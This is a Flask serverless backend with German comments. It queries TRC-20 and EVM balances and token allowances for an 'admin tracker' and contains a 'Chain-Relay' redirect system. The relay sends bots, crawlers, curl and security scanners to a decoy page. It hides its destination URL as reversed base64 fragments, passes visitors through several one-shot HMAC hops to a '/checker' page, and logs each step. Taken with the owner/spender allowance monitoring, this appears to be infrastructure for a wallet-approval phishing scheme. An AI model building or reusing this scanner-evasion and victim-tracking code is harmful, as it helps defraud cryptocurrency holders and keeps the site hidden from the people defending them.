"""
Read-only TRC-20 Queries für den Admin-Tracker — serverseitig, damit der
Browser nicht direkt auf TronGrid zugreift (free API rate-limited die
Client-IP schnell; Vercel-Egress bekommt ein eigenes Budget).

  POST /api/tronread {owner:"T…", spender:"T…", token:"usdt"|"T…"}
      → {ok:true, allow:"<raw>", bal:"<raw>"}
  POST /api/tronread {owner:"T…"}            → nur balanceOf
  POST /api/tronread {trx:"T…"}              → TRX balance (SUN)
"""
import base64, hashlib, hmac, json, os, re, time, urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from flask import Flask, request, jsonify, redirect
import base58

app = Flask(__name__)

# ── Chain-Relay (Rewrite /api/chain → /api/tronread) ─────────────────────────
# Redirect-Chain-Simulation: die Ziel-URL existiert nie im HTML; der Server
# gibt verschluesselte Fragmente + HMAC-Token aus, der Browser assembliert
# zur Laufzeit. Jeder Hop traegt ein One-Shot-Token (TTL) — Scanner die den
# Endpunkt direkt oder zu spaet aufrufen bekommen nur den Decoy-Redirect.
#
#   POST {a:"T…", fp:"<fingerprint>"} → {seg:[b64-fragmente], k:<tok step1>}
#   GET  ?k=<tok> → step<HOPS: 302 naechster Hop | step==HOPS: 302 /checker
#                   ungueltig/abgelaufen: 302 "/" (Decoy)
CHAIN_SECRET = os.environ.get("CHAIN_SECRET") or os.environ.get("ADMIN_PASS") or ""
CHAIN_HOPS = 3
CHAIN_TTL = 120
BOT_UA = re.compile(r"bot|crawl|spider|headless|phantom|curl|wget|python|"
                    r"httpclient|scanner|monitor|pingdom|uptime", re.I)
EVENTS_KEY = "chainscaner:events"
RU = os.environ.get("UPSTASH_REDIS_REST_URL", "")
RT = os.environ.get("UPSTASH_REDIS_REST_TOKEN", "")


def _redis(cmds):
    if not RU or not RT:
        return None
    req = urllib.request.Request(RU + "/pipeline", data=json.dumps(cmds).encode(),
                                 headers={"Content-Type": "application/json",
                                          "Authorization": "Bearer " + RT})
    return json.loads(urllib.request.urlopen(req, timeout=6).read())


def _push_event(ev, data):
    try:
        env = {"at": datetime.now(timezone.utc).isoformat().replace("T", " ")[:19],
               "ip": "", "ua": "chain-api",
               "ev": {"ev": ev, "t": datetime.now(timezone.utc).isoformat(), "d": data}}
        _redis([["LPUSH", EVENTS_KEY, json.dumps(env)],
                ["LTRIM", EVENTS_KEY, "0", "199"]])
    except Exception:
        pass


def _make_tok(addr, step):
    raw = "%s|%d|%d" % (addr, step, int(time.time()) + CHAIN_TTL)
    sig = hmac.new(CHAIN_SECRET.encode(), raw.encode(), hashlib.sha256).hexdigest()[:32]
    return base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=") + "." + sig


def _read_tok(tok):
    """HMAC + TTL pruefen → (addr, step) oder None."""
    try:
        p, _, s = str(tok).rpartition(".")
        raw = base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)).decode()
        addr, st, ex = raw.split("|")
        if not _valid(addr) or int(ex) < time.time():
            return None
        want = hmac.new(CHAIN_SECRET.encode(), raw.encode(),
                        hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(s, want):
            return None
        return addr, int(st)
    except Exception:
        return None


def _frag(url):
    # Fragmente: jedes Stueck umgedreht + base64 — der Client assembliert
    # zur Laufzeit; statisch steht kein URL-String im Response.
    n = max(1, len(url) // 3)
    parts = [url[i:i + n] for i in range(0, len(url), n)]
    return [base64.b64encode(p[::-1].encode()).decode() for p in parts]


# ── Flag-DB — eigene Reputationsliste (Adressen + Token-Contracts) ──────────
# {addr: {"reason": str, "sev": "low|high|critical", "at": iso}}
# Schreiben laeuft ueber /api/config (secret-gated), Lesen ist public —
# wie eine oeffentliche Blocklist.
FLAGS_KEY = "chainscaner:flags"


def _flags_get():
    try:
        out = _redis([["GET", FLAGS_KEY]])
        raw = (out[0] or {}).get("result") if out else None
        return json.loads(raw) if raw else {}
    except Exception:
        return {}


def _chain_rate_limited():
    try:
        out = _redis([["INCR", "chainscaner:chain_rate"],
                      ["EXPIRE", "chainscaner:chain_rate", "600", "NX"]])
        return not out or int((out[0] or {}).get("result") or 0) > 60
    except Exception:
        return False


def _chain(body):
    if not CHAIN_SECRET:
        return jsonify({"error": "not configured"}), 500
    if request.method == "POST":
        if _chain_rate_limited():
            return jsonify({"d": "unavailable"}), 429
        addr = str(body.get("a") or "").strip()
        fp = str(body.get("fp") or "")
        # Soft-Cloaking: offensichtliche Bots/Crawler und Requests ohne
        # Client-Fingerprint (reine Skripte) bekommen den Decoy.
        if (not _valid(addr) or not fp
                or BOT_UA.search(request.headers.get("User-Agent", ""))):
            _push_event("chain_denied", {"addr": addr[:8],
                        "ua": request.headers.get("User-Agent", "")[:60]})
            return jsonify({"d": "unavailable"})
        _push_event("chain_issued", {"addr": addr})
        return jsonify({"seg": _frag("/api/chain?k="), "k": _make_tok(addr, 1)})

    # GET = Hop-Relay — jeder Hop verlangt das Token des vorherigen.
    r = _read_tok(request.args.get("k") or "")
    if not r:
        _push_event("chain_denied", {"hop": True,
                    "ua": request.headers.get("User-Agent", "")[:60]})
        return redirect("/", code=302)
    addr, step = r
    if step < CHAIN_HOPS:
        _push_event("chain_hop", {"addr": addr, "step": step})
        return redirect("/api/chain?k=" + _make_tok(addr, step + 1), code=302)
    _push_event("chain_landed", {"addr": addr})
    return redirect("/checker?for=" + addr, code=302)

TG = ["https://api.trongrid.io", "https://api.tronstack.io"]
# Optionaler TronGrid-API-Key (Env TRONGRID_API_KEY): hebt das
# Rate-Limit der Vercel-Egress-IP. Ohne Key bleibt alles unverändert.
TG_KEY = os.environ.get("TRONGRID_API_KEY", "")
ZERO = "410000000000000000000000000000000000000000"

TRON_TOKENS = {
    "usdt": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "usdc": "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "usdd": "TPYmHEhy5n8TCEfYGqW2rPxsghSccghGRn",
    "tusd": "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
    "wtrx": "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
    "jst":  "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
    "sun":  "TSSMHYeV2uE9qYH95DqMeCuDy9vb59vTj",
    "btt":  "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4",
    "win":  "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
}


_TG_LAST = [0.0]


def _tg(path, body, _retry=0):
    # TronGrid/TronStack public: ~3 rps, 5s Suspend — "Error: rate exceeded"
    # kommt mit HTTP 200, muss im Body erkannt werden → anderen Host,
    # wenn beide gesperrt 6s warten + retry. Mindestabstand zwischen Calls.
    out = None
    res = None
    for host in TG:
        dt = time.monotonic() - _TG_LAST[0]
        if dt < 0.4:
            time.sleep(0.4 - dt)
        try:
            hdrs = {"Content-Type": "application/json"}
            if TG_KEY:
                hdrs["TRON-PRO-API-KEY"] = TG_KEY
            req = urllib.request.Request(host + path, data=json.dumps(body).encode(),
                                         headers=hdrs)
            _TG_LAST[0] = time.monotonic()
            res = json.loads(urllib.request.urlopen(req, timeout=8).read())
        except Exception:
            _TG_LAST[0] = time.monotonic()
            continue
        msg = json.dumps(res).lower()
        if "rate exceeded" in msg or "suspended" in msg:
            continue  # Suspend gilt pro Server
        out = res
        break
    if out is None and _retry < 1:
        time.sleep(6)
        return _tg(path, body, _retry + 1)
    return out


def _hex(a58):
    return base58.b58decode_check(a58).hex()


def _valid(a):
    return isinstance(a, str) and len(a) == 34 and a.startswith("T")


def _constant(contract_hex, selector, param):
    res = _tg("/wallet/triggerconstantcontract", {
        "owner_address": ZERO,
        "contract_address": contract_hex,
        "function_selector": selector,
        "parameter": param
    })
    cr = (res or {}).get("constant_result") or []
    if not cr:
        raise ValueError("empty result")
    return int(cr[0], 16)


# ── EVM Multi-Chain Scan ─────────────────────────────────────────────────────
# Read-only Produkt-Scanner: ein Request -> alle Chains parallel.
# Pro Chain ein JSON-RPC-Batch (native balance + balanceOf je Token), dann
# ein zweites Batch fuer allowances gehaltener Tokens gegen bekannte
# Spender. Preise best-effort via DefiLlama. Eine kaputte Chain liefert
# error: true im Ergebnis — der Rest bleibt funktional.

EVM_RE = re.compile(r"^0x[0-9a-fA-F]{40}$")
BAL_SEL = "0x70a08231"   # balanceOf(address)
ALLOW_SEL = "0xdd62ed3e"  # allowance(address,address)

EVM_CHAINS = [
    {"id": "ethereum", "name": "Ethereum", "native": "ETH",
     "cg": "coingecko:ethereum", "explorer": "https://etherscan.io",
     "bs": "https://eth.blockscout.com",
     "rpc": ["https://eth.llamarpc.com",
             "https://ethereum-rpc.publicnode.com",
             "https://1rpc.io/eth"],
     "tokens": [
        ("USDT", "0xdAC17F958D2ee523a2206206994597C13D831ec7", 6),
        ("USDC", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6),
        ("DAI", "0x6B175474E89094C44Da98b954EedeAC495271d0F", 18),
        ("WETH", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", 18),
        ("WBTC", "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", 8),
        ("LINK", "0x514910771AF9Ca656af840dff83E8264EcF986CA", 18),
        ("UNI", "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", 18),
        ("SHIB", "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", 18),
        ("PEPE", "0x6982508145454Ce325dDbE47a25d4ec3d2311933", 18),
        ("stETH", "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", 18),
        ("AAVE", "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", 18),
        ("USDS", "0xdC035D45d973E3EC169d2276DDab16f1e407384F", 18)],
     "spenders": [
        ("Uniswap Universal Router", "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
        ("Uniswap V2 Router", "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3")]},
    {"id": "base", "name": "Base", "native": "ETH",
     "cg": "coingecko:ethereum", "explorer": "https://basescan.org",
     "bs": "https://base.blockscout.com",
     "rpc": ["https://mainnet.base.org",
             "https://base-rpc.publicnode.com",
             "https://base.llamarpc.com"],
     "tokens": [
        ("USDC", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6),
        ("USDbC", "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", 6),
        ("USDT", "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", 6),
        ("WETH", "0x4200000000000000000000000000000000000006", 18),
        ("DAI", "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", 18),
        ("cbBTC", "0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf", 8),
        ("AERO", "0x940181a94A35A4569E4529A3CDfB74e38FD98631", 18),
        ("DEGEN", "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed", 18),
        ("BRETT", "0x532f27101965dd16442E59d40670FaF5eBB142E4", 18),
        ("EURC", "0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42", 6)],
     "spenders": [
        ("Uniswap Universal Router", "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
        ("Aerodrome Router", "0xcF77a3Ba9A5CA399B7c97c74d54e5b1Beb874E43"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3")]},
    {"id": "polygon", "name": "Polygon", "native": "POL",
     "cg": "coingecko:polygon-ecosystem-token", "explorer": "https://polygonscan.com",
     "bs": "https://polygon.blockscout.com",
     "rpc": ["https://polygon-bor-rpc.publicnode.com",
             "https://polygon.llamarpc.com",
             "https://polygon-rpc.com"],
     "tokens": [
        ("USDT", "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6),
        ("USDC", "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6),
        ("USDC.e", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", 6),
        ("DAI", "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", 18),
        ("WETH", "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", 18),
        ("WBTC", "0x1BFD67037B42Cf73acF2047067bd4F951C47D619", 8),
        ("WPOL", "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", 18),
        ("LINK", "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", 18),
        ("AAVE", "0xD6DF932A45C0f255f85145f286eA0b292B21C90B", 18),
        ("POL", "0x455e53CBB86018Ac2B8092FdCd39B8448B726187", 18)],
     "spenders": [
        ("Uniswap Universal Router", "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
        ("QuickSwap Router", "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3")]},
    {"id": "arbitrum", "name": "Arbitrum", "native": "ETH",
     "cg": "coingecko:ethereum", "explorer": "https://arbiscan.io",
     "bs": "https://arbitrum.blockscout.com",
     "rpc": ["https://arb1.arbitrum.io/rpc",
             "https://arbitrum-one-rpc.publicnode.com",
             "https://1rpc.io/arb"],
     "tokens": [
        ("USDT", "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", 6),
        ("USDC", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", 6),
        ("USDC.e", "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", 6),
        ("DAI", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", 18),
        ("WETH", "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", 18),
        ("WBTC", "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", 8),
        ("ARB", "0x912CE59144191C1204E64559FE8253a0e49E6548", 18),
        ("LINK", "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4", 18),
        ("UNI", "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0", 18),
        ("GMX", "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", 18),
        ("PENDLE", "0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8", 18)],
     "spenders": [
        ("Uniswap Universal Router", "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3"),
        ("GMX Router", "0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064")]},
    {"id": "optimism", "name": "Optimism", "native": "ETH",
     "cg": "coingecko:ethereum", "explorer": "https://optimistic.etherscan.io",
     "bs": "https://explorer.optimism.io",
     "rpc": ["https://mainnet.optimism.io",
             "https://optimism-rpc.publicnode.com",
             "https://1rpc.io/op"],
     "tokens": [
        ("USDT", "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 6),
        ("USDC", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", 6),
        ("USDC.e", "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", 6),
        ("DAI", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", 18),
        ("WETH", "0x4200000000000000000000000000000000000006", 18),
        ("WBTC", "0x68f180fcCe6836688e9084f01b5f22420647f935", 8),
        ("OP", "0x4200000000000000000000000000000000000042", 18),
        ("LINK", "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", 18),
        ("SNX", "0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4", 18),
        ("VELO", "0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db", 18)],
     "spenders": [
        ("Uniswap Universal Router", "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
        ("Velodrome Router", "0xa062aE8A9c5e11aaA026fc2670B0D65cCc8B2858"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3")]},
    {"id": "bsc", "name": "BNB Chain", "native": "BNB",
     "cg": "coingecko:binancecoin", "explorer": "https://bscscan.com",
     "rpc": ["https://bsc-rpc.publicnode.com",
             "https://bsc-dataseed.binance.org",
             "https://1rpc.io/bnb"],
     "tokens": [
        ("USDT", "0x55d398326f99059fF775485246999027B3197955", 18),
        ("USDC", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 18),
        ("FDUSD", "0xc5f0f7b66764F6ec8C8Dff7BA683102295E16409", 18),
        ("DAI", "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", 18),
        ("WBNB", "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", 18),
        ("ETH", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", 18),
        ("BTCB", "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", 18),
        ("CAKE", "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", 18),
        ("LINK", "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", 18)],
     "spenders": [
        ("PancakeSwap Router", "0x10ED43C718714eb63d5aA57B78B54704E256024E"),
        ("1inch Router", "0x1111111254EEB25477B68fb85Ed929f73A960582"),
        ("Permit2", "0x000000000022D473030F116dDEE9F6B43aC78BA3")]},
]


def _rpc_batch(urls, calls):
    """Ein JSON-RPC-Batch an die erste erreichbare URL; None bei Totalausfall."""
    body = json.dumps(calls).encode()
    for u in urls:
        try:
            req = urllib.request.Request(u, data=body,
                                         headers={"Content-Type": "application/json",
                                                  "User-Agent": "chainscaner/1.0"})
            res = json.loads(urllib.request.urlopen(req, timeout=6).read())
            if isinstance(res, list) and res:
                by_id = {r.get("id"): r for r in res if isinstance(r, dict)}
                # Rate-Limits liefern teils 200 mit error-Items — ein Batch
                # ohne valide Results waere ein falsches "leere Wallet".
                if any("result" in r for r in by_id.values()):
                    return by_id
        except Exception:
            continue
    return None


def _pad_addr(a):
    return a.lower().replace("0x", "").rjust(64, "0")


def _bs_tokens(host, addr):
    """Blockscout token-balances — komplettes Portfolio inkl. Spam/Dust.
    Liefert Symbol, Decimals, USD-Rate und reputation-Flag ohne API-Key.
    Rueckgabe: Liste (auch leer) oder None bei Ausfall."""
    try:
        req = urllib.request.Request(
            host + "/api/v2/addresses/" + addr + "/token-balances",
            headers={"User-Agent": "chainscaner/1.0"})
        data = json.loads(urllib.request.urlopen(req, timeout=5).read())
        out = []
        for it in (data if isinstance(data, list) else []):
            tk = it.get("token") or {}
            if tk.get("type") != "ERC-20":
                continue
            raw = int(it.get("value") or 0)
            if raw <= 0:
                continue
            dec = int(tk.get("decimals") or 18)
            rate = float(tk.get("exchange_rate") or 0)
            name = str(tk.get("name") or "") + " " + str(tk.get("symbol") or "")
            spam = ((tk.get("reputation") or "ok") != "ok"
                    or bool(re.search(r"https?://|\.(com|io|xyz|net|org|site|live)\b|"
                                      r"claim|airdrop|reward|visit\s", name, re.I)))
            out.append({
                "sym": tk.get("symbol") or tk.get("name") or "?",
                "ca": tk.get("address_hash") or "",
                "raw": str(raw), "dec": dec, "bal": raw / 10 ** dec,
                "usd": round(raw / 10 ** dec * rate, 4) if rate else None,
                "spam": spam,
            })
        return out
    except Exception:
        return None


def _scan_chain(chain, addr):
    out = {"id": chain["id"], "name": chain["name"],
           "native": chain["native"], "explorer": chain["explorer"],
           "tokens": [], "approvals": [], "nativeRaw": 0}
    pad = _pad_addr(addr)
    calls = [{"jsonrpc": "2.0", "id": 0, "method": "eth_getBalance",
              "params": [addr, "latest"]}]
    for i, (_s, ca, _d) in enumerate(chain["tokens"]):
        calls.append({"jsonrpc": "2.0", "id": i + 1, "method": "eth_call",
                      "params": [{"to": ca, "data": BAL_SEL + pad}, "latest"]})
    res = _rpc_batch(chain["rpc"], calls)
    if res is None:
        out["error"] = True
        return out
    try:
        out["nativeRaw"] = int((res.get(0) or {}).get("result") or "0x0", 16)
    except Exception:
        pass
    held = []
    for i, (sym, ca, dec) in enumerate(chain["tokens"]):
        try:
            raw = int((res.get(i + 1) or {}).get("result") or "0x0", 16)
        except Exception:
            raw = 0
        if raw <= 0:
            continue
        held.append({"sym": sym, "ca": ca, "raw": str(raw), "dec": dec,
                     "bal": raw / 10 ** dec})
    # Indexer-Discovery (Blockscout, key-free): komplettes Portfolio inkl.
    # Dust/Spam-Token. Faellt er aus, bleibt die kuratierte Liste aktiv.
    bst = _bs_tokens(chain["bs"], addr) if chain.get("bs") else None
    if bst is not None:
        out["tokenTotal"] = len(bst)
        out["spamCount"] = sum(1 for t in bst if t.get("spam"))
        bst.sort(key=lambda t: (t["usd"] is not None, t["usd"] or 0),
                 reverse=True)
        out["tokens"] = bst[:25]
        curated = {ca.lower() for _s, ca, _d in chain["tokens"]}
        held = [t for t in bst
                if t["ca"].lower() in curated or (t["usd"] or 0) >= 5][:20]
    else:
        out["tokens"] = held
    if not held:
        return out
    # Approvals nur fuer gehaltene Token — bounded, zweites Batch.
    acalls = []
    keys = []
    for t in held:
        for label, sp in chain["spenders"]:
            keys.append((t, label, sp))
            acalls.append({"jsonrpc": "2.0", "id": len(acalls),
                           "method": "eth_call",
                           "params": [{"to": t["ca"],
                                       "data": ALLOW_SEL + pad + _pad_addr(sp)},
                                      "latest"]})
    ares = _rpc_batch(chain["rpc"], acalls) or {}
    for i, (t, label, sp) in enumerate(keys):
        try:
            raw = int((ares.get(i) or {}).get("result") or "0x0", 16)
        except Exception:
            continue
        if raw > 0:
            a = {"sym": t["sym"], "ca": t["ca"], "spender": sp,
                 "label": label, "raw": str(raw),
                 "dec": t["dec"], "tusd": t.get("usd"), "tbal": t["bal"]}
            if raw >= 2 ** 128:
                a["unlimited"] = True
            out["approvals"].append(a)
    return out


def _llama_prices(keys):
    if not keys:
        return {}
    try:
        url = ("https://coins.llama.fi/prices/current/" + ",".join(keys)
               + "?searchWidth=4h")
        res = json.loads(urllib.request.urlopen(url, timeout=5).read())
        return res.get("coins") or {}
    except Exception:
        return {}


def _evm_scan(addr):
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=6) as ex:
        chains = list(ex.map(lambda c: _scan_chain(c, addr), EVM_CHAINS))
    keys = []
    for i, c in enumerate(chains):
        if not c.get("error"):
            keys.append(EVM_CHAINS[i]["cg"])
        for t in c["tokens"]:
            keys.append("%s:%s" % (c["id"], t["ca"]))
    prices = _llama_prices(keys)
    for i, c in enumerate(chains):
        if c.get("error"):
            continue
        np = (prices.get(EVM_CHAINS[i]["cg"]) or {}).get("price")
        if np:
            c["nativeUsd"] = c["nativeRaw"] / 1e18 * np
            c["nativeDust"] = bool(c["nativeRaw"] and c["nativeUsd"] < 1)
        for t in c["tokens"]:
            p = (prices.get("%s:%s" % (c["id"], t["ca"])) or {}).get("price")
            if p:
                t["usd"] = round(t["bal"] * p, 4)
                t["dust"] = t["usd"] < 0.01
        for a in c["approvals"]:
            if (a.get("tusd") is not None and a.get("tbal")
                    and not a.get("unlimited")):
                a["usd"] = round(int(a["raw"]) / 10 ** a["dec"] *
                                 a["tusd"] / a["tbal"], 4)
            for k in ("dec", "tusd", "tbal"):
                a.pop(k, None)
        for t in c["tokens"]:
            t.pop("dec", None)
    return {"ok": True, "addr": addr, "chains": chains,
            "took_ms": int((time.time() - t0) * 1000)}


@app.route("/api/tronread", methods=["GET", "POST"])
@app.route("/api/chain", methods=["GET", "POST"])
def route():
    body = request.get_json(force=True, silent=True) or {}
    # /api/chain wird per Rewrite in diese Function geleitet (Hobby-Plan:
    # max 12 Functions). Flask sieht den Original-Pfad — Dispatch ueber
    # Pfad ODER Request-Form: Hop-Token (k) oder Issue-Body (a+fp).
    if (request.path.startswith("/api/chain")
            or request.args.get("k") or "a" in body):
        return _chain(body)

    # Flag-DB: {flags:1} → Liste | {flag:"T…"} → Einzelcheck |
    # {flagsIn:["T…","0x…"]} → Batch (z.B. Token-Contracts einer Wallet)
    if body.get("flags") == 1 or body.get("flags") is True:
        return jsonify({"ok": True, "flags": _flags_get()})
    flag_one = str(body.get("flag") or "").strip()
    if flag_one:
        ent = _flags_get().get(flag_one)
        return jsonify({"ok": True, "flagged": bool(ent), "entry": ent})
    if isinstance(body.get("flagsIn"), list):
        f = _flags_get()
        hits = {a: f[a] for a in body["flagsIn"][:60] if a in f}
        return jsonify({"ok": True, "hits": hits})

    scan_addr = str(body.get("scan") or "").strip()
    if EVM_RE.match(scan_addr):
        ck = "chainscaner:scanc:" + scan_addr.lower()
        try:
            out = _redis([["GET", ck]])
            raw = (out[0] or {}).get("result") if out else None
            if raw:
                r = json.loads(raw)
                r["cached"] = True
                return jsonify(r)
        except Exception:
            pass
        r = _evm_scan(scan_addr)
        keys = [scan_addr]
        keys += [t["ca"] for c in r["chains"] for t in c["tokens"]]
        keys += [a["spender"] for c in r["chains"] for a in c["approvals"]]
        f = _flags_get()
        r["flags"] = {k: f[k] for k in dict.fromkeys(keys) if k in f}
        _push_event("scan_evm", {"addr": scan_addr,
                    "chains": len(r["chains"]),
                    "took_ms": r["took_ms"]})
        try:
            _redis([["SETEX", ck, "300", json.dumps(r)]])
        except Exception:
            pass
        return jsonify(r)

    trx_addr = str(body.get("trx") or "").strip()
    if _valid(trx_addr):
        acct = _tg("/wallet/getaccount", {"address": _hex(trx_addr)})
        if acct is None:
            return jsonify({"error": "read failed"}), 502
        return jsonify({"ok": True, "trx": str((acct or {}).get("balance") or 0)})

    acct_addr = str(body.get("account") or "").strip()
    if _valid(acct_addr):
        acct = _tg("/wallet/getaccount", {"address": _hex(acct_addr)})
        if acct is None:
            return jsonify({"error": "read failed"}), 502
        res = _tg("/wallet/getaccountresource", {"address": _hex(acct_addr)}) or {}
        e_avail = int(res.get("EnergyLimit") or 0) - int(res.get("EnergyUsed") or 0)
        return jsonify({"ok": True, "account": acct,
                        "energy": max(e_avail, 0)})

    # Batch: {pairs:[{owner,spender,token},…]} — ein Request fuer den
    # ganzen Scan statt N HTTP-Calls. Intern dedupliziert (balanceOf pro
    # owner+token nur einmal) und ThreadPool — warme Function + geteiltes
    # Rate-Limit-Pacing statt 6 paralleler Cold-Starts aus dem Browser.
    pairs_in = body.get("pairs")
    if isinstance(pairs_in, list):
        pairs_in = pairs_in[:60]

        def _norm(p):
            o = str((p or {}).get("owner") or "").strip()
            s = str((p or {}).get("spender") or "").strip()
            t = str((p or {}).get("token") or "usdt").strip()
            token = t if t.startswith("T") else TRON_TOKENS.get(t.lower())
            return o, s, token

        tasks, seen = [], set()
        for p in pairs_in:
            o, s, token = _norm(p)
            if not _valid(o) or not token or not _valid(token):
                continue
            if ("b", o, token) not in seen:
                seen.add(("b", o, token))
                tasks.append(("b", o, token))
            if _valid(s) and ("a", o, s, token) not in seen:
                seen.add(("a", o, s, token))
                tasks.append(("a", o, s, token))

        def _work(task):
            kind, o, rest = task[0], task[1], task[2]
            try:
                if kind == "b":
                    v = str(_constant(_hex(rest), "balanceOf(address)",
                            _hex(o)[2:].rjust(64, "0")))
                else:
                    s, token = task[2], task[3]
                    v = str(_constant(_hex(token), "allowance(address,address)",
                            _hex(o)[2:].rjust(64, "0") + _hex(s)[2:].rjust(64, "0")))
                return task, v
            except Exception:
                return task, None

        vals = {}
        with ThreadPoolExecutor(max_workers=4) as ex:
            for task, v in ex.map(_work, tasks):
                vals[task] = v

        rows = []
        for p in pairs_in:
            o, s, token = _norm(p)
            if not _valid(o) or not token or not _valid(token):
                rows.append({"error": "invalid owner/token"})
                continue
            row = {}
            bal = vals.get(("b", o, token))
            if bal is None:
                row["error"] = "bal read failed"
            else:
                row["bal"] = bal
            if _valid(s):
                allow = vals.get(("a", o, s, token))
                if allow is None:
                    row["error"] = row.get("error") or "allow read failed"
                else:
                    row["allow"] = allow
            if "error" not in row:
                row["ok"] = True
            rows.append(row)
        return jsonify({"ok": True, "rows": rows})

    owner = str(body.get("owner") or "").strip()
    spender = str(body.get("spender") or "").strip()
    tok = str(body.get("token") or "usdt").strip()
    token = tok if tok.startswith("T") else TRON_TOKENS.get(tok.lower())
    if not _valid(owner) or not token or not _valid(token):
        return jsonify({"error": "invalid owner/token"}), 400

    o_hex = _hex(owner)
    out = {"ok": True}
    try:
        if _valid(spender):
            s_hex = _hex(spender)
            out["allow"] = str(_constant(
                _hex(token), "allowance(address,address)",
                o_hex[2:].rjust(64, "0") + s_hex[2:].rjust(64, "0")))
        out["bal"] = str(_constant(
            _hex(token), "balanceOf(address)", o_hex[2:].rjust(64, "0")))
    except Exception as e:
        return jsonify({"error": "read failed: " + str(e)[:80]}), 502
    return jsonify(out)
